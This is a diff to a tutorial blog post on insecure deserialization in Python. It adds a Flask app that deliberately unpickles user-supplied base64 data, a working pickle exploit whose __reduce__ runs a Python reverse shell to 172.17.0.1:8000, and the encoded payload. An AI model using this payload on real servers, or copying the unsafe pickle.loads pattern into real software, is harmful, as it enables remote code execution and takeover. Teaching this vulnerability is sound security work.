@@ -2,14 +2,12 @@
 layout: post
 title: Understanding Insecure Deserialization with Practical Examples
 date: 2024-07-19 21:30:53.884914647 UTC
-tags: Insecure Deserialization Web Security Exploitation Python
+tags: Insecure Deserialization Web Security Exploitation Python Flask
 ---
 
 In this article, I will explain Insecure Deserialization. I will also demonstrate this by writing a simple vulnerable Python server and exploiting it.
 
 Before we begin, we need to understand what objects are, what serialization and deserialization are, and some basic networking concepts.
-
-All code in this article is available [here](https://github.com/pwnxpl0it/insecure_deserialization)
 
 Let's start!
 
@@ -195,6 +193,95 @@ Let's start the server and launch our exploit.
 ![exploit](/assets/img/deserialization/exploit-1.png)
 
 And that's it!
+
+Let's do another more advanced example.
+
+### Exploiting a flask web server
+Before we start, checkout [My Repo](https://github.com/pwnxpl0it/insecure_deserialization) for all the code and Dockerimage
+
+This is a flask app that we are going to hack, it uses the same `Person` class and calls `get_summary`
+I have only changed `summary` of `Person` to return instead of print things to the cli, so we can see it in the response.
+
+```python
+from flask import Flask, request
+import base64
+import pickle
+
+class Person:
+    def __init__(self, name, age) -> None:
+        self.name = name
+        self.age = age
+
+    def summary(self):
+        return f"My name is {self.name}, I am {self.age} years old!"
+
+
+app = Flask(__name__)
+
+@app.route("/summary")
+def get_summary():
+    # Just loading the object and calling the summary method using pickle
+    person_object = request.args.get("person")
+    if person_object is None:
+        return "missing person parameter"
+    # since we are receiving a string we need to convert it to bytes
+    person = pickle.loads(base64.b64decode(person_object))
+
+    return f"{person.summary()}"
+
+@app.route("/create")
+def create_person():
+    name = request.args.get("name")
+    age = request.args.get("age")
+
+    if name is None:
+        return "missing name parameter"
+    if age is None:
+        return "missing age parameter"
+
+    new_person = Person(name,int(age))
+    return f"{base64.b64encode(pickle.dumps(new_person)).decode()}"
+
+```
+
+This flask application has two endpoints, `/summary` and `/create`
+
+The `/create` endpoint is meant to provide an easier and secure way of creating a new instance of Person, sort of a constructor through the browser.
+
+The `/summary` endpoint is the one that deserializes the stream into `Person` and then calls `summary()` method
+
+We can try and mess around with `create` endpoint if we didn't had the code to know what this endpoint expects
+
+But we will focus on `/summary` since we have the code and we know that it takes a `person` GET parameter,it takes a base64 encoded serialized object (base64 of an object dumped with pickel) then it calls `summary()`
+
+so let's craft our exploit that does create our malicious object, base64 encode it so we can send it and pwn the server
+
+I used python reverse shell from [revshells.com](https://www.revshells.com)
+
+```python
+import pickle
+import base64
+
+class Exploit:
+    def __reduce__(self):
+        import os
+        # https://www.revshells.com/
+        return ( (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",)))
+
+if __name__ == '__main__':
+    payload = Exploit()
+    print(base64.b64encode(pickle.dumps(payload)).decode())
+
+```
+
+```console
+gASV8wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjNhweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxNzIuMTcuMC4xIiw4MDAwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSeUhZRSlC4=
+
+```
+
+Let's launch our exploit
+
+![pwned](/assets/img/deserialization/flaskapp_pwned.png)
 
 ## Preventing Insecure Deserialization vulnerabilities
 
